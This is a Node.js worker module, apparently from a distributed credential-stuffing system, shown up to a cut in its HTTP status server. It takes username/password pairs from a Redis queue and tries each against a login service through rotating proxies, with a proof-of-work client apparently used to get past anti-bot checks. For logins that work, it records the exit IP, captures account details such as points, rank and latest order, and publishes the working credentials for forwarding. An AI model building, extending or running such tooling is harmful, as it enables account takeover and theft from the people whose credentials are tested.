/**
 * Worker Node - Standalone Process for Distributed Credential Checking
 * 
 * Pulls tasks from Redis queue, executes credential checks, and publishes results.
 * Designed to run as independent processes across multiple EC2 instances.
 * 
 * Requirements: 2.1, 2.2, 2.3, 2.4, 2.5, 1.6, 5.7, 5.8, 7.3, 8.1
 */

const pLimit = require('p-limit').default || require('p-limit');
const http = require('http');
const { createLogger } = require('../../logger');
const { createStructuredLogger } = require('../logger/structured');
const { checkCredentials } = require('../../httpChecker');
const { captureAccountData } = require('../../automation/http/httpDataCapture');
const { fetchIpInfo } = require('../../automation/http/ipFetcher');
const {
  markProcessedStatus,
  makeKey,
  flushWriteBuffer,
  closeStore,
} = require('../../automation/batch/processedStore');
const powServiceClient = require('../../automation/http/fingerprinting/powServiceClient');
const { 
  JOB_QUEUE, 
  TASK_LEASE, 
  RESULT_CACHE, 
  PROGRESS_TRACKER,
  WORKER_HEARTBEAT,
  PUBSUB_CHANNELS,
  generateWorkerId 
} = require('../redis/keys');
const { getConfigService } = require('../config/configService');

const log = createLogger('worker-node');
const structuredLog = createStructuredLogger('worker-node');

/**
 * Get worker configuration from config service (hot-reloadable) or env fallback
 */
function getWorkerConfig() {
  const configService = getConfigService();
  if (configService.isInitialized()) {
    return {
      concurrency: configService.get('WORKER_CONCURRENCY') || 3,
      processedTtlMs: configService.get('PROCESSED_TTL_MS') || undefined,
      httpPort: configService.get('WORKER_HTTP_PORT') || undefined
    };
  }
  // Fallback to env
  return {
    concurrency: parseInt(process.env.WORKER_CONCURRENCY, 10) || 3,
    processedTtlMs: parseInt(process.env.PROCESSED_TTL_MS, 10) || undefined,
    httpPort: parseInt(process.env.WORKER_HTTP_PORT, 10) || undefined
  };
}

class WorkerNode {
  constructor(redisClient, options = {}) {
    this.redis = redisClient;
    this.workerId = options.workerId || generateWorkerId();
    this.powServiceUrl = options.powServiceUrl || process.env.POW_SERVICE_URL;
    
    // Concurrency configuration (read from config service at startup)
    const workerConfig = getWorkerConfig();
    this.concurrency = options.concurrency || workerConfig.concurrency;
    this.limit = pLimit(this.concurrency);
    
    // Worker state - parallel task tracking
    this.activeTasks = new Map(); // taskId -> { promise, startedAt, task }
    this.activeTaskCount = 0;
    this.shutdown = false;
    this.tasksCompleted = 0;
    this.startTime = Date.now();

    // HTTP status server
    const httpPort = options.httpPort || getWorkerConfig().httpPort || 3010;
    this.httpPort = httpPort;
    this.httpServer = null;
    
    // Metrics tracking
    this.metricsInterval = null;
    this.lastMetricsLog = Date.now();
    this.metricsLogInterval = 30000; // Log metrics every 30s
    
    // Timeouts and intervals
    this.taskTimeout = options.taskTimeout || 120000; // 2 minutes max per task
    this.heartbeatInterval = options.heartbeatInterval || 10000; // 10 seconds
    this.queueTimeout = options.queueTimeout || 5000; // 5 seconds BLPOP timeout (reduced for faster task pickup)
    
    // Intervals
    this.heartbeatTimer = null;
    
    log.info(`Worker node initialized`, {
      workerId: this.workerId,
      powServiceUrl: this.powServiceUrl,
      concurrency: this.concurrency,
      taskTimeout: this.taskTimeout,
      heartbeatInterval: this.heartbeatInterval
    });
  }

  /**
   * Main worker loop - continuously pull and process tasks in parallel
   */
  async run() {
    log.info(`Worker ${this.workerId} starting up with concurrency ${this.concurrency}`);
    
    try {
      // 1. Register worker with unique ID in Redis
      await this.registerWorker();
      
      // 2. Start heartbeat interval (10s)
      this.startHeartbeat();
      
      // 3. Start metrics logging
      this.startMetricsLogging();

      // 4. Start lightweight HTTP status server (health/metrics/status)
      await this.startHttpServer();
      
      // 4. Main processing loop - parallel task execution
      while (!this.shutdown) {
        try {
          // Only pull new tasks if we have capacity
          if (this.activeTaskCount < this.concurrency) {
            const task = await this.dequeueTask();
            
            if (task) {
              // Fire-and-forget with concurrency limit
              this.spawnTaskProcessor(task);
            }
          } else {
            // At capacity - wait for any task to complete before checking queue
            if (this.activeTasks.size > 0) {
              const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
              await Promise.race(promises).catch(() => {}); // Ignore errors, just wait for completion
            }
          }
          
          // Small delay to prevent busy waiting (reduced for faster task pickup)
          if (!this.shutdown) {
            await this.sleep(10);
          }
          
        } catch (error) {
          log.error('Error in worker main loop', {
            workerId: this.workerId,
            error: error.message,
            activeTasks: this.activeTaskCount
          });
          
          // Continue processing unless it's a fatal error
          if (this.isFatalError(error)) {
            log.error('Fatal error detected, shutting down worker', {
              workerId: this.workerId,
              error: error.message
            });
            break;
          }
          
          // For timeout errors, continue immediately (no extra delay)
          if (error.message.includes('Command timed out') || 
              error.message.includes('timeout')) {
            log.debug('Timeout error in main loop, continuing', {
              workerId: this.workerId
            });
            continue;
          }
          
          // Wait before retrying on other errors
          await this.sleep(5000);
        }
      }
      
      // Wait for all active tasks to complete before exiting
      if (this.activeTasks.size > 0) {
        log.info(`Waiting for ${this.activeTasks.size} active tasks to complete`, {
          workerId: this.workerId,
          taskIds: Array.from(this.activeTasks.keys())
        });
        
        const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
        await Promise.allSettled(promises);
      }
      
    } catch (error) {
      log.error('Worker startup failed', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    } finally {
      await this.cleanup();
    }
    
    log.info(`Worker ${this.workerId} shut down complete`, {
      tasksCompleted: this.tasksCompleted
    });
  }

  /**
   * Spawn a task processor (fire-and-forget with tracking)
   * @param {Object} task - Task object from queue
   */
  spawnTaskProcessor(task) {
    // Increment counter immediately
    this.activeTaskCount++;
    
    // Create promise wrapped with concurrency limit
    const promise = this.limit(async () => {
      try {
        await this.processTaskWithLease(task);
      } catch (error) {
        // Error already logged in processTaskWithLease
      }
    });
    
    // Track the task
    this.activeTasks.set(task.taskId, {
      promise,
      startedAt: Date.now(),
      task
    });
    
    // Clean up when done
    promise.finally(() => {
      this.activeTasks.delete(task.taskId);
      this.activeTaskCount--;
      
      log.debug(`Task slot freed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        activeNow: this.activeTaskCount,
        concurrency: this.concurrency
      });
    });
    
    log.debug(`Spawned task processor`, {
      workerId: this.workerId,
      taskId: task.taskId,
      activeNow: this.activeTaskCount,
      concurrency: this.concurrency
    });
  }

  /**
   * Register worker with Redis
   */
  async registerWorker() {
    try {
      const registrationData = {
        workerId: this.workerId,
        startTime: this.startTime,
        pid: process.pid,
        hostname: process.env.HOSTNAME || 'unknown',
        version: process.env.npm_package_version || '1.0.0'
      };
      
      // Store worker registration (no TTL - cleaned up on shutdown)
      await this.redis.executeCommand(
        'set',
        `worker:${this.workerId}:info`,
        JSON.stringify(registrationData)
      );
      
      log.info(`Worker ${this.workerId} registered successfully`, registrationData);
    } catch (error) {
      log.error('Failed to register worker', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Dequeue task from Redis with priority (retry queue first, then main queue)
   * @returns {Promise<Object|null>} Task object or null if timeout
   */
  async dequeueTask() {
    try {
      // Try retry queue first (high priority) with 1s timeout
      let result = await this.redis.executeCommand('blpop', JOB_QUEUE.retry, 1);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued retry task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId,
          retryCount: task.retryCount
        });
        return task;
      }
      
      // If no retry tasks, pull from main queue with longer timeout
      result = await this.redis.executeCommand('blpop', JOB_QUEUE.tasks, this.queueTimeout / 1000);
      
      if (result) {
        const taskJson = result[1];
        const task = JSON.parse(taskJson);
        log.debug(`Dequeued main task ${task.taskId}`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return task;
      }
      
      // Timeout - no tasks available
      return null;
      
    } catch (error) {
      // Handle timeout errors gracefully
      if (error.message.includes('Command timed out') || 
          error.message.includes('timeout')) {
        log.debug('BLPOP timeout - no tasks available', {
          workerId: this.workerId,
          timeout: this.queueTimeout
        });
        return null;
      }
      
      if (error.message.includes('BLPOP') && this.shutdown) {
        // Expected during shutdown
        return null;
      }
      
      log.error('Error dequeuing task', {
        workerId: this.workerId,
        error: error.message
      });
      throw error;
    }
  }

  /**
   * Process task with lease management
   * @param {Object} task - Task object from queue
   */
  async processTaskWithLease(task) {
    const leaseKey = TASK_LEASE.generate(task.batchId, task.taskId);
    let leaseAcquired = false;
    
    try {
      // Check if batch is cancelled before processing
      if (await this.isBatchCancelled(task.batchId)) {
        log.info(`Skipping task ${task.taskId} - batch ${task.batchId} is cancelled`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      // Acquire task lease: SET with TTL and NX (only if not exists)
      const leaseValue = JSON.stringify({
        workerId: this.workerId,
        acquiredAt: Date.now(),
        task: task
      });
      
      const acquired = await this.redis.executeCommand(
        'set',
        leaseKey,
        leaseValue,
        'EX',
        TASK_LEASE.ttl,
        'NX'
      );
      
      if (!acquired) {
        log.warn(`Task ${task.taskId} already has active lease, skipping`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      leaseAcquired = true;
      this.currentTask = task;
      
      // Double-check batch cancellation after acquiring lease
      if (await this.isBatchCancelled(task.batchId)) {
        log.info(`Task ${task.taskId} cancelled after lease acquisition`, {
          workerId: this.workerId,
          taskId: task.taskId,
          batchId: task.batchId
        });
        return;
      }
      
      log.info(`Processing task ${task.taskId}`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        username: task.username,
        proxyId: task.proxyId,
        retryCount: task.retryCount || 0
      });
      
      // Process the task with timeout
      await this.processTaskWithTimeout(task);
      
    } catch (error) {
      log.error(`Task ${task.taskId} processing failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Task failed - will be retried by coordinator if within retry limit
      // Don't re-enqueue here, let the lease expire and zombie recovery handle it
      
    } finally {
      // Release lease after completion
      if (leaseAcquired) {
        try {
          await this.redis.executeCommand('del', leaseKey);
          log.debug(`Released lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        } catch (error) {
          log.warn(`Failed to release lease for task ${task.taskId}`, {
            workerId: this.workerId,
            taskId: task.taskId,
            error: error.message
          });
        }
      }
      
      this.currentTask = null;
      this.tasksCompleted++;
    }
  }

  /**
   * Process task with timeout wrapper
   * @param {Object} task - Task to process
   */
  async processTaskWithTimeout(task) {
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        reject(new Error(`Task ${task.taskId} timed out after ${this.taskTimeout}ms`));
      }, this.taskTimeout);
      
      this.processTask(task)
        .then(resolve)
        .catch(reject)
        .finally(() => {
          clearTimeout(timeoutId);
        });
    });
  }

  /**
   * Process a single credential check task
   * @param {Object} task - Task object with credential, proxy, metadata
   * @returns {Promise<Object>} - Result object with status, capture, IP
   */
  async processTask(task) {
    const startTime = Date.now();
    
    try {
      // Extract credential, proxy, batchId from task
      const { username, password, proxyUrl, batchId, taskId } = task;
      
      log.debug(`Starting credential check for ${username}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        proxyUrl: proxyUrl ? 'configured' : 'none'
      });
      
      // Request cres from POW service (with fallback)
      // Note: POW service integration is handled internally by httpChecker.js
      // which uses powServiceClient for cres computation with automatic fallback
      
      // Execute credential check via existing httpChecker.js with assigned proxy
      const checkResult = await checkCredentials(username, password, {
        proxy: proxyUrl,
        timeoutMs: 60000,
        deferCloseOnValid: true, // Keep session open for data capture
        batchMode: true
      });
      
      let result = {
        username,
        password,
        status: checkResult.status,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: Date.now() - startTime,
        batchId,
        taskId
      };
      
      // If VALID, fetch exit IP and capture account data
      if (checkResult.status === 'VALID') {
        await this.handleValidCredential(checkResult, result, task);
      } else {
        // For non-VALID results, add error details if available
        if (checkResult.message) {
          result.errorCode = checkResult.message;
        }
      }
      
      // Store result in Result_Store with 30-day TTL
      await this.storeResult(result);
      
      // Increment progress counter
      await this.incrementProgress(batchId);
      
      // Publish events for coordinator
      await this.publishResultEvents(result, checkResult);
      
      // Log structured task completion
      structuredLog.logTaskCompletion({
        taskId: result.taskId,
        batchId: result.batchId,
        username: result.username,
        status: result.status,
        duration: result.checkDurationMs,
        proxyId: result.proxyId,
        workerId: result.workerId,
        errorCode: result.errorCode,
        ipAddress: result.ipAddress
      });
      
      log.info(`Task ${taskId} completed: ${result.status}`, {
        workerId: this.workerId,
        taskId,
        batchId,
        status: result.status,
        duration: result.checkDurationMs,
        ipAddress: result.ipAddress || 'none'
      });
      
      return result;
      
    } catch (error) {
      const duration = Date.now() - startTime;
      
      // Log structured error
      structuredLog.logError(`Task ${task.taskId} failed`, error, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        duration
      });
      
      log.error(`Task ${task.taskId} failed`, {
        workerId: this.workerId,
        taskId: task.taskId,
        batchId: task.batchId,
        error: error.message,
        duration
      });
      
      // Create error result
      const errorResult = {
        username: task.username,
        password: task.password,
        status: 'ERROR',
        errorCode: error.message,
        checkedAt: Date.now(),
        workerId: this.workerId,
        proxyId: task.proxyId,
        checkDurationMs: duration,
        batchId: task.batchId,
        taskId: task.taskId
      };
      
      // Store error result
      await this.storeResult(errorResult);
      
      // Increment progress counter (errors count as completed)
      await this.incrementProgress(task.batchId);
      
      // Log structured task completion for error
      structuredLog.logTaskCompletion({
        taskId: errorResult.taskId,
        batchId: errorResult.batchId,
        username: errorResult.username,
        status: errorResult.status,
        duration: errorResult.checkDurationMs,
        proxyId: errorResult.proxyId,
        workerId: errorResult.workerId,
        errorCode: errorResult.errorCode
      });
      
      throw error;
    }
  }

  /**
   * Handle VALID credential - fetch IP and capture data
   * @param {Object} checkResult - Result from httpChecker
   * @param {Object} result - Result object being built
   * @param {Object} task - Original task
   */
  async handleValidCredential(checkResult, result, task) {
    try {
      // If IP was already fetched during check, use it
      if (checkResult.ipAddress) {
        result.ipAddress = checkResult.ipAddress;
        log.debug(`IP address from check: ${checkResult.ipAddress}`, {
          workerId: this.workerId,
          taskId: task.taskId
        });
      } else if (task.proxyUrl && checkResult.session) {
        // Fetch exit IP for VALID credentials via ipFetcher.js
        log.debug('Fetching exit IP for VALID credential', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const ipInfo = await fetchIpInfo(checkResult.session.client, 10000);
        if (ipInfo.ip) {
          result.ipAddress = ipInfo.ip;
          log.debug(`Exit IP fetched: ${ipInfo.ip}`, {
            workerId: this.workerId,
            taskId: task.taskId
          });
        }
      }
      
      // Capture account data for VALID via httpDataCapture.js
      if (checkResult.session) {
        log.debug('Capturing account data for VALID credential', {
          workerId: this.workerId,
          taskId: task.taskId
        });
        
        const captureData = await captureAccountData(checkResult.session, {
          timeoutMs: 30000
        });
        
        result.capture = captureData;
        
        log.debug('Account data captured', {
          workerId: this.workerId,
          taskId: task.taskId,
          points: captureData.points,
          rank: captureData.rank,
          latestOrder: captureData.latestOrder
        });
        
        // Close session after capture
        if (checkResult.session.client) {
          try {
            checkResult.session.client.defaults.jar.removeAllCookies();
          } catch (e) {
            // Ignore cleanup errors
          }
        }
      }
      
    } catch (error) {
      log.warn(`Failed to capture additional data for VALID credential`, {
        workerId: this.workerId,
        taskId: task.taskId,
        error: error.message
      });
      
      // Don't fail the task if IP/capture fails - credential is still VALID
      result.captureError = error.message;
    }
  }

  /**
   * Store result in Redis Result_Store and update progress tracking
   * @param {Object} result - Result object to store
   */
  async storeResult(result) {
    try {
      const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
      const resultData = JSON.stringify(result);
      
      // Store result with immediate verification
      await this.redis.executeCommand(
        'setex',
        resultKey,
        RESULT_CACHE.ttl,
        resultData
      );
      
      // Immediately verify the result was stored
      const verification = await this.redis.executeCommand('get', resultKey);
      if (!verification) {
        throw new Error(`Failed to verify result storage for key: ${resultKey}`);
      }
      
      // Update result counts for real-time progress tracking
      await this.updateResultCounts(result);
      
      // If VALID, add to valid credentials list
      if (result.status === 'VALID') {
        await this.addValidCredential(result);
      }
      
      log.info(`Result stored and verified in cache`, {
        workerId: this.workerId,
        resultKey,
        status: result.status,
        username: result.username,
        ttl: RESULT_CACHE.ttl
      });
      
    } catch (error) {
      log.error('CRITICAL: Failed to store result in cache', {
        workerId: this.workerId,
        taskId: result.taskId,
        username: result.username,
        status: result.status,
        error: error.message,
        stack: error.stack
      });
      
      // This is critical - if we can't store results, deduplication won't work
      // Try one more time with a different approach
      try {
        const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
        const resultData = JSON.stringify(result);
        
        // Use SET with EX instead of SETEX
        await this.redis.executeCommand('set', resultKey, resultData, 'EX', RESULT_CACHE.ttl);
        
        log.warn('Result stored using fallback method', {
          workerId: this.workerId,
          resultKey,
          status: result.status
        });
        
      } catch (fallbackError) {
        log.error('CRITICAL: Fallback result storage also failed', {
          workerId: this.workerId,
          taskId: result.taskId,
          username: result.username,
          fallbackError: fallbackError.message
        });
        
        // Don't throw - but this is a serious issue that needs attention
      }
    }

    // Mirror into processed store so Telegram dedupe works in distributed mode
    try {
      const credKey = makeKey(result.username, result.password);
      const { processedTtlMs } = getWorkerConfig();
      await markProcessedStatus(credKey, result.status, processedTtlMs);
    } catch (error) {
      log.warn('Processed store write failed', {
        workerId: this.workerId,
        taskId: result.taskId,
        username: result.username,
        status: result.status,
        error: error.message
      });
    }
  }

  /**
   * Update result counts for batch progress tracking
   * @param {Object} result - Result object
   */
  async updateResultCounts(result) {
    try {
      const countsKey = PROGRESS_TRACKER.generateCounts(result.batchId);
      await this.redis.executeCommand('hincrby', countsKey, result.status, 1);
      
      log.debug(`Updated ${result.status} count for batch ${result.batchId}`, {
        workerId: this.workerId,
        batchId: result.batchId,
        status: result.status
      });
      
    } catch (error) {
      log.error('Failed to update result counts', {
        workerId: this.workerId,
        batchId: result.batchId,
        status: result.status,
        error: error.message
      });
      // Don't throw - count tracking failure shouldn't fail the task
    }
  }

  /**
   * Add valid credential to the list for progress display
   * @param {Object} result - Result object with VALID status
   */
  async addValidCredential(result) {
    try {
      const validCredsKey = PROGRESS_TRACKER.generateValidCreds(result.batchId);
      const credData = JSON.stringify({
        username: result.username,
        password: result.password,
        ipAddress: result.ipAddress || 'Unknown'
      });
      
      await this.redis.executeCommand('lpush', validCredsKey, credData);
      await this.redis.executeCommand('expire', validCredsKey, PROGRESS_TRACKER.ttl);
      
      log.debug(`Added valid credential to list for batch ${result.batchId}`, {
        workerId: this.workerId,
        batchId: result.batchId,
        username: result.username
      });
      
    } catch (error) {
      log.error('Failed to add valid credential to list', {
        workerId: this.workerId,
        batchId: result.batchId,
        username: result.username,
        error: error.message
      });
      // Don't throw - valid creds tracking failure shouldn't fail the task
    }
  }

  /**
   * Increment progress counter for batch
   * @param {string} batchId - Batch identifier
   */
  async incrementProgress(batchId) {
    try {
      const counterKey = PROGRESS_TRACKER.generateCounter(batchId);
      await this.redis.executeCommand('incr', counterKey);
      
      log.debug(`Incremented progress for batch ${batchId}`, {
        workerId: this.workerId,
        batchId
      });
      
    } catch (error) {
      log.error('Failed to increment progress counter', {
        workerId: this.workerId,
        batchId,
        error: error.message
      });
      // Don't throw - progress tracking failure shouldn't fail the task
    }
  }

  /**
   * Publish result events to Redis pub/sub for coordinator
   * @param {Object} result - Result object
   * @param {Object} checkResult - Original check result
   */
  async publishResultEvents(result, checkResult) {
    try {
      // If VALID, publish forward_event
      if (result.status === 'VALID' && result.capture) {
        const forwardEvent = {
          username: result.username,
          password: result.password,
          capture: result.capture,
          ipAddress: result.ipAddress,
          timestamp: result.checkedAt,
          workerId: this.workerId,
          batchId: result.batchId
        };
        
        await this.redis.executeCommand(
          'publish',
          PUBSUB_CHANNELS.forwardEvents,
          JSON.stringify(forwardEvent)
        );
        
        log.debug('Published forward_event', {
          workerId: this.workerId,
          username: result.username,
          batchId: result.batchId
        });
      }
      
      // If credential was previously forwarded and is now INVALID/BLOCKED, publish update_event
      if (result.status === 'INVALID' || result.status === 'BLOCKED') {
        const trackingCode = await this.redis.executeCommand('get', `msg:cred:${result.username}:${result.password}`);
        if (trackingCode) {
          const updateEvent = {
            username: result.username,
            password: result.password,
            newStatus: result.status,
            trackingCode,
            timestamp: result.checkedAt,
            workerId: this.workerId,
            batchId: result.batchId
          };

          await this.redis.executeCommand(
            'publish',
            PUBSUB_CHANNELS.updateEvents,
            JSON.stringify(updateEvent)
          );

          log.debug('Published update_event', {
            workerId: this.workerId,
            username: result.username,
            batchId: result.batchId,
            status: result.status
          });
        }
      }
      
    } catch (error) {
      log.error('Failed to publish result events', {
        workerId: this.workerId,
        taskId: result.taskId,
        error: error.message
      });
      // Don't throw - event publishing failure shouldn't fail the task
    }
  }

  /**
   * Check if error is fatal (should cause worker shutdown)
   * @param {Error} error - Error to check
   * @returns {boolean} True if fatal
   */
  isFatalError(error) {
    // Timeout errors are not fatal - they're expected during normal operation
    if (error.message.includes('Command timed out') || 
        error.message.includes('timeout')) {
      return false;
    }
    
    // Redis connection errors are fatal
    if (error.message.includes('Connection is closed') ||
        error.message.includes('ECONNREFUSED') ||
        error.message.includes('ENOTFOUND') ||
        error.message.includes('Redis connection')) {
      return true;
    }
    
    return false;
  }

  /**
   * Check if a batch is cancelled
   * @param {string} batchId - Batch ID to check
   * @returns {Promise<boolean>} True if batch is cancelled
   */
  async isBatchCancelled(batchId) {
    try {
      const cancelKey = `batch:${batchId}:cancelled`;
      const result = await this.redis.executeCommand('get', cancelKey);
      return result !== null;
    } catch (error) {
      log.error('Error checking batch cancellation status', {
        workerId: this.workerId,
        batchId,
        error: error.message
      });
      return false; // On error, assume not cancelled to avoid blocking
    }
  }

  /**
   * Sleep utility
   * @param {number} ms - Milliseconds to sleep
   * @returns {Promise<void>}
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Start heartbeat mechanism
   */
  startHeartbeat() {
    this.heartbeatTimer = setInterval(async () => {
      await this.sendHeartbeat();
    }, this.heartbeatInterval);
    
    log.debug(`Heartbeat started (${this.heartbeatInterval}ms interval)`, {
      workerId: this.workerId
    });
  }

  /**
   * Send heartbeat to coordinator
   */
  async sendHeartbeat() {
    try {
      const heartbeatData = {
        workerId: this.workerId,
        timestamp: Date.now(),
        tasksCompleted: this.tasksCompleted,
        // Concurrency info
        concurrency: this.concurrency,
        activeTasks: this.activeTaskCount,
        taskIds: Array.from(this.activeTasks.keys()),
        // Utilization percentage
        utilization: Math.round((this.activeTaskCount / this.concurrency) * 100),
        uptime: Date.now() - this.startTime,
        memoryUsage: process.memoryUsage()
      };
      
      // Use Promise.race to add additional timeout protection for heartbeat
      const heartbeatTimeout = 30000; // 30 second timeout for heartbeat operations
      
      await Promise.race([
        this.sendHeartbeatCommands(heartbeatData),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Heartbeat timeout')), heartbeatTimeout)
        )
      ]);
      
      // Log structured heartbeat
      structuredLog.logWorkerHeartbeat(heartbeatData);
      
      log.debug('Heartbeat sent', {
        workerId: this.workerId,
        tasksCompleted: this.tasksCompleted,
        activeTasks: this.activeTaskCount,
        concurrency: this.concurrency,
        utilization: heartbeatData.utilization + '%'
      });
      
    } catch (error) {
      // Heartbeat timeouts are expected under load - log as warning, not error
      const isTimeout = error.message.includes('timeout');
      const logLevel = isTimeout ? 'warn' : 'error';
      
      if (!isTimeout) {
        structuredLog.logError('Failed to send heartbeat', error, {
          workerId: this.workerId
        });
      }
      
      log[logLevel]('Failed to send heartbeat', {
        workerId: this.workerId,
        error: error.message
      });
      
      // Don't treat heartbeat timeouts as fatal - they're expected under load
      if (!isTimeout && this.isFatalError(error)) {
        log.error('Heartbeat failure indicates fatal error, initiating shutdown', {
          workerId: this.workerId
        });
        this.shutdown = true;
      }
    }
  }

  /**
   * Execute heartbeat Redis commands
   * @param {Object} heartbeatData - Heartbeat data to send
   */
  async sendHeartbeatCommands(heartbeatData) {
    // SET worker heartbeat with TTL
    await this.redis.executeCommand(
      'setex',
      WORKER_HEARTBEAT.generate(this.workerId),
      WORKER_HEARTBEAT.ttl,
      JSON.stringify(heartbeatData)
    );
    
    // PUBLISH to worker_heartbeats channel
    await this.redis.executeCommand(
      'publish',
      PUBSUB_CHANNELS.workerHeartbeats,
      JSON.stringify(heartbeatData)
    );
  }

  /**
   * Handle graceful shutdown
   */
  async handleShutdown(signal = 'SIGTERM') {
    log.info(`Worker ${this.workerId} received ${signal}, initiating graceful shutdown`, {
      activeTasks: this.activeTaskCount,
      taskIds: Array.from(this.activeTasks.keys())
    });
    
    // 1. Stop pulling new tasks immediately
    this.shutdown = true;
    
    // 2. If active tasks exist, wait for all to complete (with timeout)
    if (this.activeTasks.size > 0) {
      const maxWait = this.taskTimeout * Math.max(1, Math.ceil(this.activeTasks.size / 2));
      
      log.info(`Waiting for ${this.activeTasks.size} active tasks to complete`, {
        workerId: this.workerId,
        taskIds: Array.from(this.activeTasks.keys()),
        maxWait
      });
      
      const promises = Array.from(this.activeTasks.values()).map(t => t.promise);
      
      // Wait for all tasks or timeout
      await Promise.race([
        Promise.allSettled(promises),
        new Promise(resolve => setTimeout(resolve, maxWait))
      ]);
      
      // 3. If tasks still pending after timeout, release their leases
      if (this.activeTasks.size > 0) {
        log.warn(`${this.activeTasks.size} tasks still active after timeout, releasing leases`, {
          workerId: this.workerId,
          taskIds: Array.from(this.activeTasks.keys())
        });
        
        for (const [taskId, taskInfo] of this.activeTasks) {
          const task = taskInfo.task;
          const leaseKey = TASK_LEASE.generate(task.batchId, task.taskId);
          
          try {
            await this.redis.executeCommand('del', leaseKey);
            log.warn(`Released lease for incomplete task ${taskId}`, {
              workerId: this.workerId,
              taskId,
              batchId: task.batchId
            });
          } catch (error) {
            log.error('Failed to release lease for incomplete task', {
              workerId: this.workerId,
              taskId,
              error: error.message
            });
          }
        }
      }
    }
    
    await this.cleanup();
    
    // 4. Exit with code 0 for systemd restart
    log.info(`Worker ${this.workerId} graceful shutdown complete`, {
      tasksCompleted: this.tasksCompleted
    });
    process.exit(0);
  }

  /**
   * Cleanup resources
   */
  async cleanup() {
    // Stop heartbeat
    if (this.heartbeatTimer) {
      clearInterval(this.heartbeatTimer);
      this.heartbeatTimer = null;
    }
    
    // Stop metrics logging
    if (this.metricsInterval) {
      clearInterval(this.metricsInterval);
      this.metricsInterval = null;
    }
    
    // Clean up worker registration
    try {
      await this.redis.executeCommand('del', `worker:${this.workerId}:info`);
      await this.redis.executeCommand('del', WORKER_HEARTBEAT.generate(this.workerId));
      
      log.debug(`Cleaned up worker registration for ${this.workerId}`);
    } catch (error) {
      log.warn('Failed to clean up worker registration', {
        workerId: this.workerId,
        error: error.message
      });
    }

    // Flush buffered processed-store writes before exit
    try {
      await flushWriteBuffer();
      await closeStore();
      log.debug('Processed store flushed and closed');
    } catch (error) {
      log.warn('Processed store cleanup failed', { error: error.message });
    }

    // Stop HTTP server
    if (this.httpServer) {
      try {
        await new Promise((resolve) => this.httpServer.close(resolve));
        log.info('Worker HTTP status server stopped', { workerId: this.workerId });
      } catch (error) {
        log.warn('Failed to stop worker HTTP status server', { error: error.message });
      }
    }
  }

  /**
   * Start metrics logging interval
   */
  startMetricsLogging() {
    this.metricsInterval = setInterval(() => {
      this.logMetrics();
    }, this.metricsLogInterval);
    
    log.debug(`Metrics logging started (${this.metricsLogInterval}ms interval)`, {
      workerId: this.workerId
    });
  }

  /**
   * Log worker metrics for monitoring
   */
  logMetrics() {
    const now = Date.now();
    const uptime = now - this.startTime;
    const utilization = Math.round((this.activeTaskCount / this.concurrency) * 100);
    const memory = process.memoryUsage();
    
    // Calculate tasks per minute
    const uptimeMinutes = uptime / 60000;
    const tasksPerMinute = uptimeMinutes > 0 ? (this.tasksCompleted / uptimeMinutes).toFixed(2) : 0;
    
    log.info(`Worker metrics`, {
      workerId: this.workerId,
      activeTasks: this.activeTaskCount,
      concurrency: this.concurrency,
      utilization: `${utilization}%`,
      tasksCompleted: this.tasksCompleted,
      tasksPerMinute,
      uptimeMinutes: Math.round(uptimeMinutes),
      heapUsedMB: Math.round(memory.heapUsed / 1024 / 1024),
      heapTotalMB: Math.round(memory.heapTotal / 1024 / 1024),
      rssMB: Math.round(memory.rss / 1024 / 1024)
    });
    
    // Log structured metrics
    structuredLog.logWorkerMetrics({
      workerId: this.workerId,
      activeTasks: this.activeTaskCount,
      concurrency: this.concurrency,
      utilization,
      tasksCompleted: this.tasksCompleted,
      tasksPerMinute: parseFloat(tasksPerMinute),
      uptime,
      memory
    });
  }

  /**
   * Start an HTTP server exposing /status, /health, /metrics
   */
  async startHttpServer() {
    if (this.httpServer) return;

    const handler = async (req, res) => {
      try {
        if (req.method === 'OPTIONS') {
          res.writeHead(200, this.getCorsHeaders());
          return res.end();
        }

        if (req.method === 'GET' && req.url === '/health') {
          const payload = this.buildHealthPayload();
          res.writeHead(payload.status === 'healthy' ? 200 : 503, {
            'Content-Type': 'application/json',
            ...this.getCorsHeaders(),
          });
          return res.end(JSON.stringify(payload));
        }

        if (req.method === 'GET' && req.url === '/status') {
          const payload = this.buildStatusPayload();
          res.writeHead(200, { 'Content-Type': 'application/json', ...this.getCorsHeaders() });
          return res.end(JSON.stringify(payload));
        }

        if (req.method === 'GET' && req.url === '/metrics') {
          const body = this.buildMetricsPayload();
          res.writeHead(200, {
            'Content-Type': 'text/plain; version=0.0.4; charset=utf-8',
            ...this.getCorsHeaders(),
          });
          return res.end(body);
        }

        if (req.method === 'GET' && req.url === '/') {
          res.writeHead(200, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
          return res.end('worker status: /health /status /metrics\n');
        }

        res.writeHead(404, { 'Content-Type': 'text/plain', ...this.getCorsHeaders() });
        res.end('Not Found');
      } catch (error) {
